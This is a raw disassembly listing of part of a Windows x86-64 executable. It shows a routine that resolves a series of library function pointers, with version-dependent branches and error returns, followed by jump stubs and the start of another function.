   140003485:	48 8d 15 74 f9 01 00 	lea    0x1f974(%rip),%rdx        # 0x140022e00
   14000348c:	48 8b cb             	mov    %rbx,%rcx
   14000348f:	ff 15 9b eb 01 00    	call   *0x1eb9b(%rip)        # 0x140022030
   140003495:	48 89 05 84 f7 02 00 	mov    %rax,0x2f784(%rip)        # 0x140032c20
   14000349c:	48 85 c0             	test   %rax,%rax
   14000349f:	75 21                	jne    0x1400034c2
   1400034a1:	48 8d 15 68 f9 01 00 	lea    0x1f968(%rip),%rdx        # 0x140022e10
   1400034a8:	48 8d 0d 59 f4 01 00 	lea    0x1f459(%rip),%rcx        # 0x140022908
   1400034af:	e8 ac e6 ff ff       	call   0x140001b60
   1400034b4:	83 c8 ff             	or     $0xffffffff,%eax
   1400034b7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400034bc:	48 83 c4 20          	add    $0x20,%rsp
   1400034c0:	5f                   	pop    %rdi
   1400034c1:	c3                   	ret
   1400034c2:	48 8d 15 6f f9 01 00 	lea    0x1f96f(%rip),%rdx        # 0x140022e38
   1400034c9:	48 8b cb             	mov    %rbx,%rcx
   1400034cc:	ff 15 5e eb 01 00    	call   *0x1eb5e(%rip)        # 0x140022030
   1400034d2:	48 89 05 e7 f6 02 00 	mov    %rax,0x2f6e7(%rip)        # 0x140032bc0
   1400034d9:	48 85 c0             	test   %rax,%rax
   1400034dc:	75 21                	jne    0x1400034ff
   1400034de:	48 8d 15 6b f9 01 00 	lea    0x1f96b(%rip),%rdx        # 0x140022e50
   1400034e5:	48 8d 0d 1c f4 01 00 	lea    0x1f41c(%rip),%rcx        # 0x140022908
   1400034ec:	e8 6f e6 ff ff       	call   0x140001b60
   1400034f1:	83 c8 ff             	or     $0xffffffff,%eax
   1400034f4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400034f9:	48 83 c4 20          	add    $0x20,%rsp
   1400034fd:	5f                   	pop    %rdi
   1400034fe:	c3                   	ret
   1400034ff:	48 8d 15 7a f9 01 00 	lea    0x1f97a(%rip),%rdx        # 0x140022e80
   140003506:	48 8b cb             	mov    %rbx,%rcx
   140003509:	ff 15 21 eb 01 00    	call   *0x1eb21(%rip)        # 0x140022030
   14000350f:	48 89 05 9a f6 02 00 	mov    %rax,0x2f69a(%rip)        # 0x140032bb0
   140003516:	48 85 c0             	test   %rax,%rax
   140003519:	75 21                	jne    0x14000353c
   14000351b:	48 8d 15 76 f9 01 00 	lea    0x1f976(%rip),%rdx        # 0x140022e98
   140003522:	48 8d 0d df f3 01 00 	lea    0x1f3df(%rip),%rcx        # 0x140022908
   140003529:	e8 32 e6 ff ff       	call   0x140001b60
   14000352e:	83 c8 ff             	or     $0xffffffff,%eax
   140003531:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003536:	48 83 c4 20          	add    $0x20,%rsp
   14000353a:	5f                   	pop    %rdi
   14000353b:	c3                   	ret
   14000353c:	48 8d 15 8d f9 01 00 	lea    0x1f98d(%rip),%rdx        # 0x140022ed0
   140003543:	48 8b cb             	mov    %rbx,%rcx
   140003546:	ff 15 e4 ea 01 00    	call   *0x1eae4(%rip)        # 0x140022030
   14000354c:	48 89 05 65 f6 02 00 	mov    %rax,0x2f665(%rip)        # 0x140032bb8
   140003553:	48 85 c0             	test   %rax,%rax
   140003556:	75 21                	jne    0x140003579
   140003558:	48 8d 15 89 f9 01 00 	lea    0x1f989(%rip),%rdx        # 0x140022ee8
   14000355f:	48 8d 0d a2 f3 01 00 	lea    0x1f3a2(%rip),%rcx        # 0x140022908
   140003566:	e8 f5 e5 ff ff       	call   0x140001b60
   14000356b:	83 c8 ff             	or     $0xffffffff,%eax
   14000356e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003573:	48 83 c4 20          	add    $0x20,%rsp
   140003577:	5f                   	pop    %rdi
   140003578:	c3                   	ret
   140003579:	48 8d 15 a0 f9 01 00 	lea    0x1f9a0(%rip),%rdx        # 0x140022f20
   140003580:	48 8b cb             	mov    %rbx,%rcx
   140003583:	ff 15 a7 ea 01 00    	call   *0x1eaa7(%rip)        # 0x140022030
   140003589:	48 89 05 48 f6 02 00 	mov    %rax,0x2f648(%rip)        # 0x140032bd8
   140003590:	48 85 c0             	test   %rax,%rax
   140003593:	75 21                	jne    0x1400035b6
   140003595:	48 8d 15 94 f9 01 00 	lea    0x1f994(%rip),%rdx        # 0x140022f30
   14000359c:	48 8d 0d 65 f3 01 00 	lea    0x1f365(%rip),%rcx        # 0x140022908
   1400035a3:	e8 b8 e5 ff ff       	call   0x140001b60
   1400035a8:	83 c8 ff             	or     $0xffffffff,%eax
   1400035ab:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400035b0:	48 83 c4 20          	add    $0x20,%rsp
   1400035b4:	5f                   	pop    %rdi
   1400035b5:	c3                   	ret
   1400035b6:	48 8d 15 a3 f9 01 00 	lea    0x1f9a3(%rip),%rdx        # 0x140022f60
   1400035bd:	48 8b cb             	mov    %rbx,%rcx
   1400035c0:	ff 15 6a ea 01 00    	call   *0x1ea6a(%rip)        # 0x140022030
   1400035c6:	48 89 05 03 f6 02 00 	mov    %rax,0x2f603(%rip)        # 0x140032bd0
   1400035cd:	48 85 c0             	test   %rax,%rax
   1400035d0:	75 21                	jne    0x1400035f3
   1400035d2:	48 8d 15 97 f9 01 00 	lea    0x1f997(%rip),%rdx        # 0x140022f70
   1400035d9:	48 8d 0d 28 f3 01 00 	lea    0x1f328(%rip),%rcx        # 0x140022908
   1400035e0:	e8 7b e5 ff ff       	call   0x140001b60
   1400035e5:	83 c8 ff             	or     $0xffffffff,%eax
   1400035e8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400035ed:	48 83 c4 20          	add    $0x20,%rsp
   1400035f1:	5f                   	pop    %rdi
   1400035f2:	c3                   	ret
   1400035f3:	48 8d 15 9e f9 01 00 	lea    0x1f99e(%rip),%rdx        # 0x140022f98
   1400035fa:	48 8b cb             	mov    %rbx,%rcx
   1400035fd:	ff 15 2d ea 01 00    	call   *0x1ea2d(%rip)        # 0x140022030
   140003603:	48 89 05 26 f6 02 00 	mov    %rax,0x2f626(%rip)        # 0x140032c30
   14000360a:	48 85 c0             	test   %rax,%rax
   14000360d:	75 21                	jne    0x140003630
   14000360f:	48 8d 15 92 f9 01 00 	lea    0x1f992(%rip),%rdx        # 0x140022fa8
   140003616:	48 8d 0d eb f2 01 00 	lea    0x1f2eb(%rip),%rcx        # 0x140022908
   14000361d:	e8 3e e5 ff ff       	call   0x140001b60
   140003622:	83 c8 ff             	or     $0xffffffff,%eax
   140003625:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000362a:	48 83 c4 20          	add    $0x20,%rsp
   14000362e:	5f                   	pop    %rdi
   14000362f:	c3                   	ret
   140003630:	48 8d 15 a1 f9 01 00 	lea    0x1f9a1(%rip),%rdx        # 0x140022fd8
   140003637:	48 8b cb             	mov    %rbx,%rcx
   14000363a:	ff 15 f0 e9 01 00    	call   *0x1e9f0(%rip)        # 0x140022030
   140003640:	48 89 05 b9 f5 02 00 	mov    %rax,0x2f5b9(%rip)        # 0x140032c00
   140003647:	48 85 c0             	test   %rax,%rax
   14000364a:	75 21                	jne    0x14000366d
   14000364c:	48 8d 15 9d f9 01 00 	lea    0x1f99d(%rip),%rdx        # 0x140022ff0
   140003653:	48 8d 0d ae f2 01 00 	lea    0x1f2ae(%rip),%rcx        # 0x140022908
   14000365a:	e8 01 e5 ff ff       	call   0x140001b60
   14000365f:	83 c8 ff             	or     $0xffffffff,%eax
   140003662:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003667:	48 83 c4 20          	add    $0x20,%rsp
   14000366b:	5f                   	pop    %rdi
   14000366c:	c3                   	ret
   14000366d:	48 8d 15 ac f9 01 00 	lea    0x1f9ac(%rip),%rdx        # 0x140023020
   140003674:	48 8b cb             	mov    %rbx,%rcx
   140003677:	ff 15 b3 e9 01 00    	call   *0x1e9b3(%rip)        # 0x140022030
   14000367d:	48 89 05 74 f5 02 00 	mov    %rax,0x2f574(%rip)        # 0x140032bf8
   140003684:	48 85 c0             	test   %rax,%rax
   140003687:	75 21                	jne    0x1400036aa
   140003689:	48 8d 15 a8 f9 01 00 	lea    0x1f9a8(%rip),%rdx        # 0x140023038
   140003690:	48 8d 0d 71 f2 01 00 	lea    0x1f271(%rip),%rcx        # 0x140022908
   140003697:	e8 c4 e4 ff ff       	call   0x140001b60
   14000369c:	83 c8 ff             	or     $0xffffffff,%eax
   14000369f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400036a4:	48 83 c4 20          	add    $0x20,%rsp
   1400036a8:	5f                   	pop    %rdi
   1400036a9:	c3                   	ret
   1400036aa:	48 8d 15 bf f9 01 00 	lea    0x1f9bf(%rip),%rdx        # 0x140023070
   1400036b1:	48 8b cb             	mov    %rbx,%rcx
   1400036b4:	ff 15 76 e9 01 00    	call   *0x1e976(%rip)        # 0x140022030
   1400036ba:	48 89 05 07 f5 02 00 	mov    %rax,0x2f507(%rip)        # 0x140032bc8
   1400036c1:	48 85 c0             	test   %rax,%rax
   1400036c4:	75 21                	jne    0x1400036e7
   1400036c6:	48 8d 15 bb f9 01 00 	lea    0x1f9bb(%rip),%rdx        # 0x140023088
   1400036cd:	48 8d 0d 34 f2 01 00 	lea    0x1f234(%rip),%rcx        # 0x140022908
   1400036d4:	e8 87 e4 ff ff       	call   0x140001b60
   1400036d9:	83 c8 ff             	or     $0xffffffff,%eax
   1400036dc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400036e1:	48 83 c4 20          	add    $0x20,%rsp
   1400036e5:	5f                   	pop    %rdi
   1400036e6:	c3                   	ret
   1400036e7:	48 8d 15 d2 f9 01 00 	lea    0x1f9d2(%rip),%rdx        # 0x1400230c0
   1400036ee:	48 8b cb             	mov    %rbx,%rcx
   1400036f1:	ff 15 39 e9 01 00    	call   *0x1e939(%rip)        # 0x140022030
   1400036f7:	48 89 05 aa f4 02 00 	mov    %rax,0x2f4aa(%rip)        # 0x140032ba8
   1400036fe:	48 85 c0             	test   %rax,%rax
   140003701:	75 21                	jne    0x140003724
   140003703:	48 8d 15 ce f9 01 00 	lea    0x1f9ce(%rip),%rdx        # 0x1400230d8
   14000370a:	48 8d 0d f7 f1 01 00 	lea    0x1f1f7(%rip),%rcx        # 0x140022908
   140003711:	e8 4a e4 ff ff       	call   0x140001b60
   140003716:	83 c8 ff             	or     $0xffffffff,%eax
   140003719:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000371e:	48 83 c4 20          	add    $0x20,%rsp
   140003722:	5f                   	pop    %rdi
   140003723:	c3                   	ret
   140003724:	83 ff 1e             	cmp    $0x1e,%edi
   140003727:	7d 7a                	jge    0x1400037a3
   140003729:	48 8d 15 d8 f9 01 00 	lea    0x1f9d8(%rip),%rdx        # 0x140023108
   140003730:	48 8b cb             	mov    %rbx,%rcx
   140003733:	ff 15 f7 e8 01 00    	call   *0x1e8f7(%rip)        # 0x140022030
   140003739:	48 89 05 a8 f4 02 00 	mov    %rax,0x2f4a8(%rip)        # 0x140032be8
   140003740:	48 85 c0             	test   %rax,%rax
   140003743:	75 21                	jne    0x140003766
   140003745:	48 8d 15 d4 f9 01 00 	lea    0x1f9d4(%rip),%rdx        # 0x140023120
   14000374c:	48 8d 0d b5 f1 01 00 	lea    0x1f1b5(%rip),%rcx        # 0x140022908
   140003753:	e8 08 e4 ff ff       	call   0x140001b60
   140003758:	83 c8 ff             	or     $0xffffffff,%eax
   14000375b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003760:	48 83 c4 20          	add    $0x20,%rsp
   140003764:	5f                   	pop    %rdi
   140003765:	c3                   	ret
   140003766:	48 8d 15 e3 f9 01 00 	lea    0x1f9e3(%rip),%rdx        # 0x140023150
   14000376d:	48 8b cb             	mov    %rbx,%rcx
   140003770:	ff 15 ba e8 01 00    	call   *0x1e8ba(%rip)        # 0x140022030
   140003776:	48 89 05 d3 f4 02 00 	mov    %rax,0x2f4d3(%rip)        # 0x140032c50
   14000377d:	48 85 c0             	test   %rax,%rax
   140003780:	75 21                	jne    0x1400037a3
   140003782:	48 8d 15 df f9 01 00 	lea    0x1f9df(%rip),%rdx        # 0x140023168
   140003789:	48 8d 0d 78 f1 01 00 	lea    0x1f178(%rip),%rcx        # 0x140022908
   140003790:	e8 cb e3 ff ff       	call   0x140001b60
   140003795:	83 c8 ff             	or     $0xffffffff,%eax
   140003798:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000379d:	48 83 c4 20          	add    $0x20,%rsp
   1400037a1:	5f                   	pop    %rdi
   1400037a2:	c3                   	ret
   1400037a3:	48 8d 15 ee f9 01 00 	lea    0x1f9ee(%rip),%rdx        # 0x140023198
   1400037aa:	48 8b cb             	mov    %rbx,%rcx
   1400037ad:	ff 15 7d e8 01 00    	call   *0x1e87d(%rip)        # 0x140022030
   1400037b3:	48 89 05 6e f4 02 00 	mov    %rax,0x2f46e(%rip)        # 0x140032c28
   1400037ba:	48 85 c0             	test   %rax,%rax
   1400037bd:	75 21                	jne    0x1400037e0
   1400037bf:	48 8d 15 ea f9 01 00 	lea    0x1f9ea(%rip),%rdx        # 0x1400231b0
   1400037c6:	48 8d 0d 3b f1 01 00 	lea    0x1f13b(%rip),%rcx        # 0x140022908
   1400037cd:	e8 8e e3 ff ff       	call   0x140001b60
   1400037d2:	83 c8 ff             	or     $0xffffffff,%eax
   1400037d5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400037da:	48 83 c4 20          	add    $0x20,%rsp
   1400037de:	5f                   	pop    %rdi
   1400037df:	c3                   	ret
   1400037e0:	48 8d 15 f9 f9 01 00 	lea    0x1f9f9(%rip),%rdx        # 0x1400231e0
   1400037e7:	48 8b cb             	mov    %rbx,%rcx
   1400037ea:	ff 15 40 e8 01 00    	call   *0x1e840(%rip)        # 0x140022030
   1400037f0:	48 89 05 a9 f3 02 00 	mov    %rax,0x2f3a9(%rip)        # 0x140032ba0
   1400037f7:	48 85 c0             	test   %rax,%rax
   1400037fa:	75 21                	jne    0x14000381d
   1400037fc:	48 8d 15 ed f9 01 00 	lea    0x1f9ed(%rip),%rdx        # 0x1400231f0
   140003803:	48 8d 0d fe f0 01 00 	lea    0x1f0fe(%rip),%rcx        # 0x140022908
   14000380a:	e8 51 e3 ff ff       	call   0x140001b60
   14000380f:	83 c8 ff             	or     $0xffffffff,%eax
   140003812:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003817:	48 83 c4 20          	add    $0x20,%rsp
   14000381b:	5f                   	pop    %rdi
   14000381c:	c3                   	ret
   14000381d:	48 8d 15 fc f9 01 00 	lea    0x1f9fc(%rip),%rdx        # 0x140023220
   140003824:	48 8b cb             	mov    %rbx,%rcx
   140003827:	ff 15 03 e8 01 00    	call   *0x1e803(%rip)        # 0x140022030
   14000382d:	48 89 05 14 f4 02 00 	mov    %rax,0x2f414(%rip)        # 0x140032c48
   140003834:	48 85 c0             	test   %rax,%rax
   140003837:	75 21                	jne    0x14000385a
   140003839:	48 8d 15 f0 f9 01 00 	lea    0x1f9f0(%rip),%rdx        # 0x140023230
   140003840:	48 8d 0d c1 f0 01 00 	lea    0x1f0c1(%rip),%rcx        # 0x140022908
   140003847:	e8 14 e3 ff ff       	call   0x140001b60
   14000384c:	83 c8 ff             	or     $0xffffffff,%eax
   14000384f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003854:	48 83 c4 20          	add    $0x20,%rsp
   140003858:	5f                   	pop    %rdi
   140003859:	c3                   	ret
   14000385a:	48 8d 15 ff f9 01 00 	lea    0x1f9ff(%rip),%rdx        # 0x140023260
   140003861:	48 8b cb             	mov    %rbx,%rcx
   140003864:	ff 15 c6 e7 01 00    	call   *0x1e7c6(%rip)        # 0x140022030
   14000386a:	48 89 05 c7 f3 02 00 	mov    %rax,0x2f3c7(%rip)        # 0x140032c38
   140003871:	48 85 c0             	test   %rax,%rax
   140003874:	75 21                	jne    0x140003897
   140003876:	48 8d 15 f3 f9 01 00 	lea    0x1f9f3(%rip),%rdx        # 0x140023270
   14000387d:	48 8d 0d 84 f0 01 00 	lea    0x1f084(%rip),%rcx        # 0x140022908
   140003884:	e8 d7 e2 ff ff       	call   0x140001b60
   140003889:	83 c8 ff             	or     $0xffffffff,%eax
   14000388c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003891:	48 83 c4 20          	add    $0x20,%rsp
   140003895:	5f                   	pop    %rdi
   140003896:	c3                   	ret
   140003897:	48 8d 15 02 fa 01 00 	lea    0x1fa02(%rip),%rdx        # 0x1400232a0
   14000389e:	48 8b cb             	mov    %rbx,%rcx
   1400038a1:	ff 15 89 e7 01 00    	call   *0x1e789(%rip)        # 0x140022030
   1400038a7:	48 89 05 ea f2 02 00 	mov    %rax,0x2f2ea(%rip)        # 0x140032b98
   1400038ae:	48 85 c0             	test   %rax,%rax
   1400038b1:	75 21                	jne    0x1400038d4
   1400038b3:	48 8d 15 f6 f9 01 00 	lea    0x1f9f6(%rip),%rdx        # 0x1400232b0
   1400038ba:	48 8d 0d 47 f0 01 00 	lea    0x1f047(%rip),%rcx        # 0x140022908
   1400038c1:	e8 9a e2 ff ff       	call   0x140001b60
   1400038c6:	83 c8 ff             	or     $0xffffffff,%eax
   1400038c9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400038ce:	48 83 c4 20          	add    $0x20,%rsp
   1400038d2:	5f                   	pop    %rdi
   1400038d3:	c3                   	ret
   1400038d4:	48 8d 15 05 fa 01 00 	lea    0x1fa05(%rip),%rdx        # 0x1400232e0
   1400038db:	48 8b cb             	mov    %rbx,%rcx
   1400038de:	ff 15 4c e7 01 00    	call   *0x1e74c(%rip)        # 0x140022030
   1400038e4:	48 89 05 85 f3 02 00 	mov    %rax,0x2f385(%rip)        # 0x140032c70
   1400038eb:	48 85 c0             	test   %rax,%rax
   1400038ee:	75 21                	jne    0x140003911
   1400038f0:	48 8d 15 f9 f9 01 00 	lea    0x1f9f9(%rip),%rdx        # 0x1400232f0
   1400038f7:	48 8d 0d 0a f0 01 00 	lea    0x1f00a(%rip),%rcx        # 0x140022908
   1400038fe:	e8 5d e2 ff ff       	call   0x140001b60
   140003903:	83 c8 ff             	or     $0xffffffff,%eax
   140003906:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000390b:	48 83 c4 20          	add    $0x20,%rsp
   14000390f:	5f                   	pop    %rdi
   140003910:	c3                   	ret
   140003911:	48 8d 15 08 fa 01 00 	lea    0x1fa08(%rip),%rdx        # 0x140023320
   140003918:	48 8b cb             	mov    %rbx,%rcx
   14000391b:	ff 15 0f e7 01 00    	call   *0x1e70f(%rip)        # 0x140022030
   140003921:	48 89 05 50 f3 02 00 	mov    %rax,0x2f350(%rip)        # 0x140032c78
   140003928:	48 85 c0             	test   %rax,%rax
   14000392b:	75 21                	jne    0x14000394e
   14000392d:	48 8d 15 0c fa 01 00 	lea    0x1fa0c(%rip),%rdx        # 0x140023340
   140003934:	48 8d 0d cd ef 01 00 	lea    0x1efcd(%rip),%rcx        # 0x140022908
   14000393b:	e8 20 e2 ff ff       	call   0x140001b60
   140003940:	83 c8 ff             	or     $0xffffffff,%eax
   140003943:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003948:	48 83 c4 20          	add    $0x20,%rsp
   14000394c:	5f                   	pop    %rdi
   14000394d:	c3                   	ret
   14000394e:	83 ff 1e             	cmp    $0x1e,%edi
   140003951:	0f 8c 33 01 00 00    	jl     0x140003a8a
   140003957:	48 8d 15 22 fa 01 00 	lea    0x1fa22(%rip),%rdx        # 0x140023380
   14000395e:	48 8b cb             	mov    %rbx,%rcx
   140003961:	ff 15 c9 e6 01 00    	call   *0x1e6c9(%rip)        # 0x140022030
   140003967:	48 89 05 82 f2 02 00 	mov    %rax,0x2f282(%rip)        # 0x140032bf0
   14000396e:	48 85 c0             	test   %rax,%rax
   140003971:	75 21                	jne    0x140003994
   140003973:	48 8d 15 1e fa 01 00 	lea    0x1fa1e(%rip),%rdx        # 0x140023398
   14000397a:	48 8d 0d 87 ef 01 00 	lea    0x1ef87(%rip),%rcx        # 0x140022908
   140003981:	e8 da e1 ff ff       	call   0x140001b60
   140003986:	83 c8 ff             	or     $0xffffffff,%eax
   140003989:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000398e:	48 83 c4 20          	add    $0x20,%rsp
   140003992:	5f                   	pop    %rdi
   140003993:	c3                   	ret
   140003994:	48 8b cb             	mov    %rbx,%rcx
   140003997:	83 ff 23             	cmp    $0x23,%edi
   14000399a:	7c 3a                	jl     0x1400039d6
   14000399c:	48 8d 15 25 fa 01 00 	lea    0x1fa25(%rip),%rdx        # 0x1400233c8
   1400039a3:	ff 15 87 e6 01 00    	call   *0x1e687(%rip)        # 0x140022030
   1400039a9:	48 89 05 90 f2 02 00 	mov    %rax,0x2f290(%rip)        # 0x140032c40
   1400039b0:	48 85 c0             	test   %rax,%rax
   1400039b3:	75 5b                	jne    0x140003a10
   1400039b5:	48 8d 15 1c fa 01 00 	lea    0x1fa1c(%rip),%rdx        # 0x1400233d8
   1400039bc:	48 8d 0d 45 ef 01 00 	lea    0x1ef45(%rip),%rcx        # 0x140022908
   1400039c3:	e8 98 e1 ff ff       	call   0x140001b60
   1400039c8:	83 c8 ff             	or     $0xffffffff,%eax
   1400039cb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400039d0:	48 83 c4 20          	add    $0x20,%rsp
   1400039d4:	5f                   	pop    %rdi
   1400039d5:	c3                   	ret
   1400039d6:	48 8d 15 2b fa 01 00 	lea    0x1fa2b(%rip),%rdx        # 0x140023408
   1400039dd:	ff 15 4d e6 01 00    	call   *0x1e64d(%rip)        # 0x140022030
   1400039e3:	48 89 05 56 f2 02 00 	mov    %rax,0x2f256(%rip)        # 0x140032c40
   1400039ea:	48 85 c0             	test   %rax,%rax
   1400039ed:	75 21                	jne    0x140003a10
   1400039ef:	48 8d 15 22 fa 01 00 	lea    0x1fa22(%rip),%rdx        # 0x140023418
   1400039f6:	48 8d 0d 0b ef 01 00 	lea    0x1ef0b(%rip),%rcx        # 0x140022908
   1400039fd:	e8 5e e1 ff ff       	call   0x140001b60
   140003a02:	83 c8 ff             	or     $0xffffffff,%eax
   140003a05:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003a0a:	48 83 c4 20          	add    $0x20,%rsp
   140003a0e:	5f                   	pop    %rdi
   140003a0f:	c3                   	ret
   140003a10:	48 8d 15 31 fa 01 00 	lea    0x1fa31(%rip),%rdx        # 0x140023448
   140003a17:	48 8b cb             	mov    %rbx,%rcx
   140003a1a:	ff 15 10 e6 01 00    	call   *0x1e610(%rip)        # 0x140022030
   140003a20:	48 89 05 31 f2 02 00 	mov    %rax,0x2f231(%rip)        # 0x140032c58
   140003a27:	48 85 c0             	test   %rax,%rax
   140003a2a:	75 21                	jne    0x140003a4d
   140003a2c:	48 8d 15 2d fa 01 00 	lea    0x1fa2d(%rip),%rdx        # 0x140023460
   140003a33:	48 8d 0d ce ee 01 00 	lea    0x1eece(%rip),%rcx        # 0x140022908
   140003a3a:	e8 21 e1 ff ff       	call   0x140001b60
   140003a3f:	83 c8 ff             	or     $0xffffffff,%eax
   140003a42:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003a47:	48 83 c4 20          	add    $0x20,%rsp
   140003a4b:	5f                   	pop    %rdi
   140003a4c:	c3                   	ret
   140003a4d:	48 8d 15 3c fa 01 00 	lea    0x1fa3c(%rip),%rdx        # 0x140023490
   140003a54:	48 8b cb             	mov    %rbx,%rcx
   140003a57:	ff 15 d3 e5 01 00    	call   *0x1e5d3(%rip)        # 0x140022030
   140003a5d:	48 89 05 04 f2 02 00 	mov    %rax,0x2f204(%rip)        # 0x140032c68
   140003a64:	48 85 c0             	test   %rax,%rax
   140003a67:	75 21                	jne    0x140003a8a
   140003a69:	48 8d 15 38 fa 01 00 	lea    0x1fa38(%rip),%rdx        # 0x1400234a8
   140003a70:	48 8d 0d 91 ee 01 00 	lea    0x1ee91(%rip),%rcx        # 0x140022908
   140003a77:	e8 e4 e0 ff ff       	call   0x140001b60
   140003a7c:	83 c8 ff             	or     $0xffffffff,%eax
   140003a7f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003a84:	48 83 c4 20          	add    $0x20,%rsp
   140003a88:	5f                   	pop    %rdi
   140003a89:	c3                   	ret
   140003a8a:	83 ff 20             	cmp    $0x20,%edi
   140003a8d:	7c 3d                	jl     0x140003acc
   140003a8f:	48 8d 15 42 fa 01 00 	lea    0x1fa42(%rip),%rdx        # 0x1400234d8
   140003a96:	48 8b cb             	mov    %rbx,%rcx
   140003a99:	ff 15 91 e5 01 00    	call   *0x1e591(%rip)        # 0x140022030
   140003a9f:	48 89 05 ba f1 02 00 	mov    %rax,0x2f1ba(%rip)        # 0x140032c60
   140003aa6:	48 85 c0             	test   %rax,%rax
   140003aa9:	75 21                	jne    0x140003acc
   140003aab:	48 8d 15 46 fa 01 00 	lea    0x1fa46(%rip),%rdx        # 0x1400234f8
   140003ab2:	48 8d 0d 4f ee 01 00 	lea    0x1ee4f(%rip),%rcx        # 0x140022908
   140003ab9:	e8 a2 e0 ff ff       	call   0x140001b60
   140003abe:	83 c8 ff             	or     $0xffffffff,%eax
   140003ac1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003ac6:	48 83 c4 20          	add    $0x20,%rsp
   140003aca:	5f                   	pop    %rdi
   140003acb:	c3                   	ret
   140003acc:	33 c0                	xor    %eax,%eax
   140003ace:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003ad3:	48 83 c4 20          	add    $0x20,%rsp
   140003ad7:	5f                   	pop    %rdi
   140003ad8:	c3                   	ret
   140003ad9:	cc                   	int3
   140003ada:	cc                   	int3
   140003adb:	cc                   	int3
   140003adc:	cc                   	int3
   140003add:	cc                   	int3
   140003ade:	cc                   	int3
   140003adf:	cc                   	int3
   140003ae0:	48 ff 25 41 f1 02 00 	rex.W jmp *0x2f141(%rip)        # 0x140032c28
   140003ae7:	cc                   	int3
   140003ae8:	cc                   	int3
   140003ae9:	cc                   	int3
   140003aea:	cc                   	int3
   140003aeb:	cc                   	int3
   140003aec:	cc                   	int3
   140003aed:	cc                   	int3
   140003aee:	cc                   	int3
   140003aef:	cc                   	int3
   140003af0:	48 ff 25 a9 f0 02 00 	rex.W jmp *0x2f0a9(%rip)        # 0x140032ba0
   140003af7:	cc                   	int3
   140003af8:	cc                   	int3
   140003af9:	cc                   	int3
   140003afa:	cc                   	int3
   140003afb:	cc                   	int3
   140003afc:	cc                   	int3
   140003afd:	cc                   	int3
   140003afe:	cc                   	int3
   140003aff:	cc                   	int3
   140003b00:	48 ff 25 91 f0 02 00 	rex.W jmp *0x2f091(%rip)        # 0x140032b98
   140003b07:	cc                   	int3
   140003b08:	cc                   	int3
   140003b09:	cc                   	int3
   140003b0a:	cc                   	int3
   140003b0b:	cc                   	int3
   140003b0c:	cc                   	int3
   140003b0d:	cc                   	int3
   140003b0e:	cc                   	int3
   140003b0f:	cc                   	int3
   140003b10:	48 ff 25 61 f0 02 00 	rex.W jmp *0x2f061(%rip)        # 0x140032b78
   140003b17:	cc                   	int3
   140003b18:	cc                   	int3
   140003b19:	cc                   	int3
   140003b1a:	cc                   	int3
   140003b1b:	cc                   	int3
   140003b1c:	cc                   	int3
   140003b1d:	cc                   	int3
   140003b1e:	cc                   	int3
   140003b1f:	cc                   	int3
   140003b20:	48 ff 25 59 f0 02 00 	rex.W jmp *0x2f059(%rip)        # 0x140032b80
   140003b27:	cc                   	int3
   140003b28:	cc                   	int3
   140003b29:	cc                   	int3
   140003b2a:	cc                   	int3
   140003b2b:	cc                   	int3
   140003b2c:	cc                   	int3
   140003b2d:	cc                   	int3
   140003b2e:	cc                   	int3
   140003b2f:	cc                   	int3
   140003b30:	83 b9 7c 40 00 00 01 	cmpl   $0x1,0x407c(%rcx)
   140003b37:	75 07                	jne    0x140003b40
   140003b39:	48 ff 25 20 f0 02 00 	rex.W jmp *0x2f020(%rip)        # 0x140032b60
   140003b40:	c3                   	ret
   140003b41:	cc                   	int3
   140003b42:	cc                   	int3
   140003b43:	cc                   	int3
   140003b44:	cc                   	int3
   140003b45:	cc                   	int3
   140003b46:	cc                   	int3
   140003b47:	cc                   	int3
   140003b48:	cc                   	int3
   140003b49:	cc                   	int3
   140003b4a:	cc                   	int3
   140003b4b:	cc                   	int3
   140003b4c:	cc                   	int3
   140003b4d:	cc                   	int3
   140003b4e:	cc                   	int3
   140003b4f:	cc                   	int3
   140003b50:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003b55:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003b5a:	57                   	push   %rdi
   140003b5b:	48 83 ec 20          	sub    $0x20,%rsp
   140003b5f:	83 3d 76 d5 03 00 00 	cmpl   $0x0,0x3d576(%rip)        # 0x1400410dc
   140003b66:	48 8b f1             	mov    %rcx,%rsi
   140003b69:	74 4e                	je     0x140003bb9
   140003b6b:	48 8d 91 78 30 00 00 	lea    0x3078(%rcx),%rdx
   140003b72:	45 33 c0             	xor    %r8d,%r8d
   140003b75:	33 c9                	xor    %ecx,%ecx
   140003b77:	e8 24 1f 00 00       	call   0x140005aa0
   140003b7c:	48 8b d8             	mov    %rax,%rbx
   140003b7f:	48 85 c0             	test   %rax,%rax
   140003b82:	75 1f                	jne    0x140003ba3
